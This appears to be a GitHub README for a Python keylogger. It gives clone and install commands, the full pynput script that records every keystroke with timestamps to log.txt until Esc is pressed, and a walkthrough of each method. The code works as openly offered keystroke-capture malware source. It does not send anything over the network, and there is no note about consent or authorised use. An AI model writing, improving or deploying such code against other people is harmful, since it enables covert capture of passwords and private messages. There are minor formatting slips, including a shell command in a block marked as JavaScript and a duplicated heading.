
# Keylogger

This Python script implements a simple keylogger using the pynput library to capture keystrokes. The script runs in the background, recording keys pressed on the keyboard and saving them to a log file (log.txt).

## Installation

1. Clone the repo or just copy the script to a desired .py file

```bash
git clone https://github.com/yaxhx/keylogger.git
cd keylogger

```
2. Install the pynput library

```bash
pip install pynput

```


## Usage

1. Run the script
```javascript
python key.py

```
2. Stop the script
```bash
Press the 'Esc' key to stop the keylogger.

```

## Script
```python
from pynput import keyboard
import time
import threading
import os
import datetime

class KeyLogger:
    def __init__(self):
        self.keys = []
        self.running = False
        self.file_name = 'log.txt'

    def start(self):
        self.running = True
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

    def stop(self):
        self.running = False
        self.listener.stop()

    def on_press(self, key):
        if key == keyboard.Key.esc:
            self.stop()
        else:
            self.keys.append(key)

    def on_release(self, key):
        pass

    def write_keys(self):
        while self.running:
            if self.keys:
                with open(self.file_name, 'a') as f:
                    f.write(str(datetime.datetime.now()) + '\n')
                    for key in self.keys:
                        f.write(str(key) + '\n')
                self.keys = []

    def run(self):
        self.start()
        writer = threading.Thread(target=self.write_keys)
        writer.start()
        while self.running:
            time.sleep(1)

    def main(self):
        self.run()

if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.main()
```
## Features

- Captures all key presses.
- Records the timestamp of each capture session
- Saves logs to a file (log.txt).
- Stops logging when the Esc key is pressed.

## Script Overview

***'KeyLogger' Class***
>The KeyLogger class contains methods to start, stop, and run the keylogger.

- ***`__init__()`***: Initializes the keylogger, sets up an empty list to store keys, and sets the log file name.

- ***`start()`***: Starts the key listener.
- ***`stop()`***: Stops the key listener.
- ***`on_press(key)`***: Handles key press events. If the Esc key is pressed, it stops the keylogger; otherwise, it adds the key to the list.

- ***`on_release(key)`***: Placeholder for key release events (not used).

- ***`write_keys()`***: Writes the captured keys to the log file at regular intervals.
- ***`run()`***: Starts the key listener and the logging thread.
- ***`main()`***: Entry point to run the keylogger.

![](https://media.giphy.com/media/xTiTnBELA6Mb1TeeOc/giphy.gif?cid=790b7611daqio7016ovb4mlaptxdctxr6gzfc2zkg01ai0lc&ep=v1_gifs_search&rid=giphy.gif&ct=g )

# Keylogger
# Keylogger
